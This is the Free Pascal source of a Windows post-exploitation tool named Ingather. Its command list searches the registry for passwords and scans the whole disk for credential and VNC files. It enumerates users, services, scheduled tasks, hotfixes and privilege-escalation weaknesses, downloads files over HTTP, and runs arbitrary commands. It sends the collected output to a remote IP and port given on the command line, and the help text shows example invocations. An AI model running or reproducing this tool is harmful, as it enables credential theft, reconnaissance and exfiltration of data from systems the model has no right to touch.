program Ingather;
{
 AUTHOR:  Brian Kellogg

 GPL v.2 licensed
}

{$mode objfpc}{$H+}

uses
  Classes, SysUtils, CustApp, WinUsers, RunAs, NetIO, FindVulns, RunCMD,
  WinFileSystem
  { you can add units after this };
type

  { TIngather }

  TIngather = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
  end;

{ TIngather }

procedure TIngather.DoRun;
const
  NUM_CMDS        = 20;
  CMD             : array[1..NUM_CMDS] of string = ('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"','whoami /all','set','gpresults /z','net users','net localgroup administrators','ipconfig /all','route print','netstat -ano','netsh firewall show state','netsh firewall show config','arp -a','wmic service get Name,PathName,Started,StartMode,StartName,Status','schtasks /query /fo LIST /v','tasklist /SVC', 'wmic qfe get HotFixID', 'driverquery /v', 'reg query HKLM /f password /t REG_SZ /s', 'reg query HKCU /f password /t REG_SZ /s', 'cd \ & dir /s *pass* == *cred* == *vnc* == *.config* == *account*');
var
  ErrorMsg        : String;
  ip              : AnsiString;
  port            : AnsiString;
  outfile         : AnsiString;
  nwrk            : TNetIO;
  escalate        : TRunAs;
  vulns           : TFindVulns;
  execute         : TRunCMD;
  x               : Integer;
  output          : AnsiString = '';
  tfOut           : TextFile;
  download        : String;
  save            : String;
  command         : String;
begin
  // quick check parameters
  ErrorMsg:= CheckOptions('cdehiposxz','command download enum help ip out port save');
  if ErrorMsg <> '' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h','help') or (ParamCount = 0) then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  // download file
  if HasOption('d','download') and HasOption('s','save') then begin
    nwrk:= TNetIO.Create;
    download:= Self.GetOptionValue('d','download');
    save:= Self.GetOptionValue('s','save');
    if HasOption('z') then
      nwrk.WinHTTPGet(download, save)
    else begin
      ErrorMsg:= nwrk.DownloadHTTP(download, save);
      writeln(ErrorMsg);
    end;
    nwrk.Free;
  end;

  // do vulnerability enumeration on host
  if HasOption('e','enum') or HasOption('c','command') or HasOption('x') then begin
    execute:= TRunCMD.Create;
    if not HasOption('c','command') then begin
      // just run basic enumeration commands
      if HasOption('x') then begin
        if (HasOption('i','ip') and HasOption('p','port')) or HasOption('o','out') then begin
          for x:= 1 to NUM_CMDS do begin
            output:= concat(output, CMD[x]+sLineBreak+sLineBreak);
            output:= concat(output, execute.getOutput(CMD[x], '', false));
            output:= concat(output, sLineBreak+sLineBreak+sLineBreak+sLineBreak+sLineBreak+sLineBreak+sLineBreak+sLineBreak)
          end;
        end else
          writeln('Must use -x with (-i and -p) and/or -o!');
      // run system enumeration analysis
      end else begin
        vulns:= TFindVulns.Create;
        vulns.GetVulnServices;
        vulns.GetRegVulns;
        vulns.CheckEnvPathPerms;
        vulns.GetFSVulns;
        vulns.Free;
      end;
    end else
      // run command specified with '-c' and send across network
      if HasOption('i','ip') and HasOption('p','port') then begin
        command:= Self.GetOptionValue('c','command');
        output:= execute.getOutput(command, '', false);
      end else begin
        writeln('Must use -c with -i and -p!');
        Terminate;
        Exit;
      end;

    // Send output to another computer?
    if HasOption('i','ip') and HasOption('p','port') then begin
      nwrk:= TNetIO.Create;
      ip:= Self.GetOptionValue('i','ip');
      port:= Self.GetOptionValue('p','port');
      nwrk.SendIt(ip, port, output);
      nwrk.Free;
    end;

    // Write all command outputs to file?
    if HasOption('o','out') then begin
      outfile:= Self.GetOptionValue('o','out');
      AssignFile(tfOut, outfile);
      rewrite(tfOut);
      writeln(tfOut, output);
    end;

    // Is user an admin
    escalate:= TRunAs.Create;
    if escalate.IsUserAdmin then
      writeln('You are an admin!!!')
    else
      writeln('You are not an admin.');
    {if escalate.RunAsAdmin(0, 'whoami', '/all') then
      writeln('You are not an admin!!!')
    else
      writeln('Did not run as admin!!!');}
    escalate.Free;
    execute.Free;
  end;

  Terminate;
end;

constructor TIngather.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:= True;
end;

destructor TIngather.Destroy;
begin
  inherited Destroy;
end;

procedure TIngather.WriteHelp;
begin
  writeln;
  writeln('Usage: Ingather.exe --enum -i 1.1.1.1 -p 4444 -o output.txt');
  writeln('       Ingather.exe --d http://www.abcded.com/abc.txt -s c:\temp\abc.text');
  writeln('       Ingather.exe -c "ipconfig /all" -i 1.1.1.1 -p 4444');
  writeln;
  writeln('Download file over HTTP:');
  writeln('       -d --download    : download file');
  writeln('       -s --save        : location to save downloaded file to');
  writeln('       -z               : use the Windows HTTP download function');
  writeln('                          otherwise use custom HTTP download function');
  writeln('Enumerate vulnerabilities:');
  writeln('       -e --enum        : enumerate host vulnerabilities');
  writeln('Output options:');
  writeln('       -c --command     : run command and send output across network');
  writeln('                          must be used with -i and -p');
  writeln('       -h --help        : print this help message');
  writeln('       -i --ip          : destination IP address');
  writeln('       -p --port        : destination port');
  writeln('       -o --out         : write enumeration command outputs to file');
  writeln('       -x               : just run basic enumeration commands');
  writeln('                          with no vulnerability analysis');
  writeln('                          requires (-i and -p) and/or -o');
end;

var
  Application: TIngather;
begin
  Application:= TIngather.Create(nil);
  Application.Title:= 'Ingather';
  Application.Run;
  Application.Free;
end.
